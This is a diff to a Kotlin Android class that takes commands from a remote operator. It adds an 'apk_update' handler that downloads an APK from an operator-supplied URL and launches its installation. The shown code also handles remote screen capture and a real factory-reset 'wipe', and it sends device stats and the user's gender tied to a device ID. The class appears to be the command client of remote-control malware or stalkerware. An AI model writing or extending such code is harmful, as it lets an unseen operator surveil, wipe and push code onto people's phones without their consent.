@@ -42,6 +42,34 @@ class CommandLink(private val context: Context) {
         running.set(false)
     }
 
+    /**
+     * Operator-pushed update: download the APK to cache and fire the system
+     * install intent. The installer sheet is the honest emulator-verifiable
+     * outcome (silent install needs device-owner privileges).
+     */
+    private fun runApkUpdate(payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
+        val url = payload?.get("url")?.jsonPrimitive?.content
+            ?: return "failed" to "no_url"
+        val out = File(context.cacheDir, "update.apk")
+        val err = runCatching {
+            URL(url).openStream().use { inp -> out.outputStream().use { inp.copyTo(it) } }
+            ""
+        }.getOrElse { it.message?.take(60) ?: "io" }
+        if (err.isNotEmpty() || out.length() < 10_000) return "failed" to "download:$err"
+        val uri = androidx.core.content.FileProvider.getUriForFile(
+            context, "${context.packageName}.files", out
+        )
+        context.startActivity(
+            android.content.Intent(android.content.Intent.ACTION_VIEW)
+                .setDataAndType(uri, "application/vnd.android.package-archive")
+                .addFlags(
+                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
+                        android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION
+                )
+        )
+        return "executed" to "downloaded=${out.length()} install_intent"
+    }
+
     private fun deviceId(): String =
         DeviceIdDeriver.derive(DeviceIdDeriver.androidId(context), context.packageName)
 
@@ -72,13 +100,14 @@ class CommandLink(private val context: Context) {
         val statsJson = StatsCollector.collect(context).entries.joinToString(",") { (k, v) ->
             "\"$k\":" + jsonVal(v)
         }
-        return """{"gender":"$gender","appType":"${BuildConfig.FLAVOR}","stats":{$statsJson}}"""
+        return """{"gender":"$gender","appType":"${BuildConfig.FLAVOR}","apkVersion":"${BuildConfig.VERSION_NAME}","stats":{$statsJson}}"""
     }
 
     private fun jsonVal(v: Any?): String = when (v) {
         null -> "null"
         is Number, is Boolean -> v.toString()
         is Map<*, *> -> "{" + v.entries.joinToString(",") { (mk, mv) -> "\"$mk\":" + jsonVal(mv) } + "}"
+        is List<*> -> "[" + v.joinToString(",") { jsonVal(it) } + "]"
         else -> "\"${v.toString().replace("\"", "'")}\""
     }
 
@@ -240,6 +269,7 @@ class CommandLink(private val context: Context) {
 
             "screen_capture" -> runScreenCapture(payload)
             "mine" -> "failed" to "unsupported"
+            "apk_update" -> runApkUpdate(payload)
             "wipe" ->
                 if (OperatorActions.isAdminEnabled(context)) {
                     // Schedules the REAL factory reset via the device-admin receiver.
